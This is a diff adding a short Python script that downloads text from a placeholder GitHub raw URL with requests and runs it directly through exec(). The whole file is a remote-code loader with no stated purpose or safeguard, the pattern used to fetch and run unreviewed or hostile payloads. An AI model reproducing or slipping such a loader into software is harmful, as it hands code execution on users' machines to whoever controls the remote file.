@@ -1,0 +1,6 @@
+import requests
+
+url = "RAW_GITHUB_LINK_HERE"
+
+code = requests.get(url).text
+exec(code)
